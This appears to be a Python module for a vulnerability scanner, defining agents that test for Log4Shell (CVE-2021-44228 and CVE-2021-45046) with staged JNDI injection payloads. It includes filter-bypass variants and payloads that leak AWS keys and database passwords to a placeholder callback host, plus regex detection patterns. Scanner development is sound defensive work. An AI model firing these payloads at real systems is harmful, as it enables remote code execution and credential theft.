"""Log4Shell Agent - CVE-2021-44228 (CWE-917)."""

import re
from typing import Dict, List, Pattern

from ..base import BaseAgent, PayloadStage


class Log4ShellAgent(BaseAgent):
    """
    Log4Shell (CVE-2021-44228) testing agent.

    Tests for Log4j JNDI injection vulnerabilities including:
    - LDAP JNDI lookups
    - RMI JNDI lookups
    - DNS JNDI lookups
    - Various bypass techniques

    Payloads derived from ZAP's Log4ShellScanRule.java
    """

    @property
    def vulnerability_type(self) -> str:
        return "log4shell"

    @property
    def cweid(self) -> int:
        return 917  # Expression Language Injection

    @property
    def priority(self) -> int:
        return 10  # Critical - RCE vulnerability

    @property
    def staged_payloads(self) -> Dict[PayloadStage, List[str]]:
        # Note: These payloads require a callback server (COLLABORATOR_DOMAIN)
        # to detect successful exploitation in blind scenarios
        return {
            PayloadStage.PROBE: [
                # Basic JNDI lookups
                "${jndi:ldap://COLLABORATOR_DOMAIN/probe}",
                "${jndi:rmi://COLLABORATOR_DOMAIN/probe}",
                "${jndi:dns://COLLABORATOR_DOMAIN/probe}",
                # Nested lookups
                "${${lower:j}ndi:ldap://COLLABORATOR_DOMAIN/probe}",
                "${${upper:j}ndi:ldap://COLLABORATOR_DOMAIN/probe}",
            ],
            PayloadStage.CONFIRM: [
                # More variations
                "${jndi:ldap://COLLABORATOR_DOMAIN/confirm}",
                "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://COLLABORATOR_DOMAIN/confirm}",
                # With context extraction
                "${jndi:ldap://COLLABORATOR_DOMAIN/${env:USER}}",
                "${jndi:ldap://COLLABORATOR_DOMAIN/${sys:os.name}}",
                # DNS canary
                "${jndi:dns://confirm.COLLABORATOR_DOMAIN}",
            ],
            PayloadStage.EXPLOIT: [
                # Data extraction attempts
                "${jndi:ldap://COLLABORATOR_DOMAIN/${env:AWS_SECRET_ACCESS_KEY}}",
                "${jndi:ldap://COLLABORATOR_DOMAIN/${env:AWS_ACCESS_KEY_ID}}",
                "${jndi:ldap://COLLABORATOR_DOMAIN/${env:DATABASE_PASSWORD}}",
                "${jndi:ldap://COLLABORATOR_DOMAIN/${sys:user.name}}",
                "${jndi:ldap://COLLABORATOR_DOMAIN/${java:version}}",
                # Hostname/IP extraction
                "${jndi:ldap://COLLABORATOR_DOMAIN/${hostName}}",
            ],
            PayloadStage.BYPASS: [
                # Case bypasses
                "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://COLLABORATOR_DOMAIN/}",
                "${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://COLLABORATOR_DOMAIN/}",
                # Encoded variants
                "${j${::-n}di:ldap://COLLABORATOR_DOMAIN/}",
                "${jn${::-d}i:ldap://COLLABORATOR_DOMAIN/}",
                "${jnd${::-i}:ldap://COLLABORATOR_DOMAIN/}",
                # Unicode bypass
                "${jndi:ldap://COLLABORATOR_DOMAIN/\u0061}",
                # Empty lookup bypass
                "${${::-j}${::-n}${::-d}${::-i}:ldap://COLLABORATOR_DOMAIN/}",
                # Double nested
                "${${lower:${lower:jndi}}:ldap://COLLABORATOR_DOMAIN/}",
                # With obfuscation
                "${j${k8s:k5:-ND}i:ldap://COLLABORATOR_DOMAIN/}",
                "${j${main:\\k5:-Nd}i:ldap://COLLABORATOR_DOMAIN/}",
                # env lookup in protocol
                "${jndi:${env:BAR:-l}dap://COLLABORATOR_DOMAIN/}",
                # date bypass
                "${jndi:ldap://COLLABORATOR_DOMAIN:1389/${date:YYYY}}",
            ],
        }

    def get_detection_patterns(self) -> List[Pattern]:
        """Return patterns that indicate Log4Shell vulnerability."""
        patterns = [
            # JNDI error messages
            r"javax\.naming",
            r"jndi",
            r"NamingException",
            r"InitialContext",
            r"lookup.*failed",
            # LDAP errors
            r"ldap.*error",
            r"LdapException",
            r"connection.*ldap",
            # RMI errors
            r"rmi.*error",
            r"RemoteException",
            r"Registry",
            # DNS resolution (in error)
            r"UnknownHostException",
            r"could not resolve",
            # Log4j specific
            r"log4j",
            r"org\.apache\.logging",
            r"StrSubstitutor",
            r"MessagePatternConverter",
            # Java errors
            r"java\.lang\.ClassNotFoundException",
            r"java\.net\.ConnectException",
            r"java\.io\.IOException",
            # Deserialization indicators
            r"ObjectInputStream",
            r"readObject",
            # Stack traces with relevant classes
            r"at org\.apache\.log4j",
            r"at org\.apache\.logging\.log4j",
        ]
        return [re.compile(p, re.IGNORECASE) for p in patterns]


class Log4Shell2Agent(Log4ShellAgent):
    """Agent for Log4j 2.x specific payloads."""

    @property
    def vulnerability_type(self) -> str:
        return "log4shell2"

    @property
    def staged_payloads(self) -> Dict[PayloadStage, List[str]]:
        base = super().staged_payloads

        # Add Log4j 2.x specific bypasses for CVE-2021-45046
        base[PayloadStage.BYPASS].extend([
            # Context lookup bypass (CVE-2021-45046)
            "${ctx:loginId}${jndi:ldap://COLLABORATOR_DOMAIN/}",
            "${map:type}${jndi:ldap://COLLABORATOR_DOMAIN/}",
            # Bundle lookup
            "${bundle:com.example.Messages:key}${jndi:ldap://COLLABORATOR_DOMAIN/}",
        ])

        return base
